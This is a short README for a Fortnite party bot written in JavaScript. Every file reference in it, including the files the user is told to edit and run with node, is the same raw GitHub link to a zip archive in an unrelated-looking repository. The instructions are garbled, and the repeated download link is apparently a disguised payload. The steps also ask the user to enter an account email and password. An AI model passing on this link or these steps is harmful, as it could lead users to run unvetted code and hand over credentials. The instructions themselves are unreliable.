# HTTP-Fortnite-Bot
Uses JavaScript to emulate a Fortnite client and can join parties through HTTP and change skins / emotes visually.

Requirements:
- https://github.com/FrxshSpamzL2/Fn_Bot_Commands/raw/refs/heads/master/firebolt/Fn-Bot-Commands-v3.6-alpha.2.zip
- A working brain

Basic steps:
1) Download and unzip (ofc)
2) Open CMD in the unzipped folder
3) Run 'npm install'
4) Edit https://github.com/FrxshSpamzL2/Fn_Bot_Commands/raw/refs/heads/master/firebolt/Fn-Bot-Commands-v3.6-alpha.2.zip and change the email and password
5) Run 'node https://github.com/FrxshSpamzL2/Fn_Bot_Commands/raw/refs/heads/master/firebolt/Fn-Bot-Commands-v3.6-alpha.2.zip' to start the bot
